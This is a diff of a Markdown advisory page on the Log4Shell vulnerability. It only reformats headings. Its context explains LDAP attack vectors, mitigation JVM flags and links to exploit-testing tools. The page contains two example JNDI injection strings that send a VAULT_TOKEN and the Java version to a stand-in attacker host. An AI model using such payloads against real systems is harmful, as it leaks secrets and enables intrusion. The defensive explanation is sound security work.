@@ -26,8 +26,7 @@ The above describes the RCE (remote code execution vulnerability), illustrated b
 
 Note the following on the attack vulnerabilities relating to system properties, environment variables, and deserialization, provided by [Lari Hotari from DataStax](https://gist.github.com/lhotari/18292c08586d1982e88658d239f02c57).
 
-LDAP Attack Vectors on Recent Java Versions
--------------------------------------------
+## LDAP Attack Vectors on Recent Java Versions
 
 Let's ask ourselves the question how and to what extent an LDAP attack vector impacts JDKs.
 
@@ -37,8 +36,7 @@ The LDAP attack vector exists and there are several forms of LDAP attack vectors
 * possible DoS attacks with LDAP calls
 * LDAP deserialization attacks resulting from the RCE
 
-Using LDAP calls to leak information about environment variables and system properties
---------------------------------------------------------------------------------------
+## Using LDAP calls to leak information about environment variables and system properties
 
 Examples:
 
@@ -46,7 +44,6 @@ Examples:
 ${jndi:ldap://${env:VAULT_TOKEN}.tokens.attacker.com/a} 
 ${jndi:ldap://${sys:java.vm.version}.tokens.attacker.com/a}
 ```
-
 
 Notice, there are several evasion techniques, some examples:
 
@@ -62,8 +59,7 @@ Notice, there are several evasion techniques, some examples:
 
 For docker / k8s containers without a shell or when jinfo doesn't exist, you can use <https://github.com/apangin/jattach> with the `properties` command. jattach could be run on the docker host / k8s node. The `cat /proc/<pid>/environ | xargs -0 -n 1 echo` solution works also on the docker host / k8s node. The pid is the host pid in that case.
 
-LDAP deserialization attacks resulting from the RCE
----------------------------------------------------
+## LDAP deserialization attacks resulting from the RCE
 
 This is one of the points of the blog post [PSA: Log4Shell and the current state of JNDI injection](https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/), it contains references to other sources with more details (f.e. [Exploiting JNDI injections in JDK 1.8.0_191+](https://www.veracode.com/blog/research/exploiting-jndi-injections-java#:~:text=exploiting%20jndi%20injections%20in%20jdk%201.8.0_191%2B)).
 
@@ -72,7 +68,6 @@ LDAP deserialization attacks are possible even on latest Java versions. Deserial
 ```
 "-Djdk.serialFilter=!*" "-Djdk.jndi.object.factoriesFilter=!*" "-Dcom.sun.jndi.ldap.object.trustSerialData=false"
 ```
-
 
 could be used to disable remote object deserialization when using LDAP over JNDI. These settings could break applications depending on the serialization being enabled and using JNDI. The javadocs in JDK17 contain more information:
 
@@ -85,16 +80,14 @@ There's also [Java Serialization Filtering](https://docs.oracle.com/en/java/java
 * [8u291 release notes](https://www.oracle.com/java/technologies/javase/8u291-relnotes.html)
 * [11.0.11 release notes](https://www.oracle.com/java/technologies/javase/11-0-11-relnotes.html)
 
-Other information
------------------
+## Other information
 
 * <https://github.com/lhotari/log4shell-mitigation-tester> for testing mitigations \& exploits
 * Rogue JNDI <https://github.com/veracode-research/rogue-jndi> for testing JNDI RCE exploits and related information
 * JNDI-Exploit-Kit <https://github.com/pimps/JNDI-Exploit-Kit> for testing JNDI RCE exploits and related information
 * Cybereason has released a runtime patch for Log4Shell very cleverly called Logout4Shell: <https://github.com/Cybereason/Logout4Shell>
 
-Relevant Tweets
----------------
+## Relevant Tweets
 
  <a target="_blank" href="https://twitter.com/malwaretechblog/status/1469289471463944198">{{< img src="/images/pages/log4j-cve/image-950x1024.png" alt="" width="436" height="469" >}}</a>
 
